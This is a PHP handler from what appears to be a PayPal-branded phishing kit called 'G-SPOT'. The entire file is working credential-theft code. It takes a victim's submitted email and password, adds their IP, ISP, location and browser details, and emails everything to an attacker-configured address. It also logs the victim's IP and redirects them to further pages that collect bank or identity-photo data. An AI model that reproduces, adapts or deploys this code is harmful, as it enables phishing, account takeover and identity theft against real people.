<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
$file = "../G-SPOT/settingan.json";
$sett = file_get_contents($file);
$json = json_decode($sett);
$get_photo = $json[3]->status;
$get_bank = $json[4]->status;
if($_POST['email'] == "") {
	exit();
}
$ip = getUserIP(); 
$ispuser = getisp($ip);
$message .= "#--------------------[ G-SPOT. Inc ]-------------------------#\n";
$message .= "#--------------------[ EMAIL LOGIN ]-------------------------#\n";
$message .= "User ID		: ".$_POST['email']."\n";
$message .= "Password		: ".$_POST['password']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------[ きみ の こと が すき だから ]-----------------#\n";
$subject = "TEMBUS EMAIL: ".$_POST['email']." [ $cn - $os - $ip ]";

$frommail = $setting['sender_mail'];
$headers = "From: G-SPOT PAYPAL <".$frommail.">";
kirim_mail($setting['email_result'], $headers, $subject, $message);
tulis_file("../result/total_email.txt", $ip);
if($get_bank == "on"){
 echo "<script type='text/javascript'>window.top.location='bank?key=$key';</script>";
}else if($get_photo == "on"){
 echo "<script type='text/javascript'>window.top.location='identity?key=$key';</script>";
}else{
echo "<script type='text/javascript'>window.top.location='done?key=$key';</script>";
}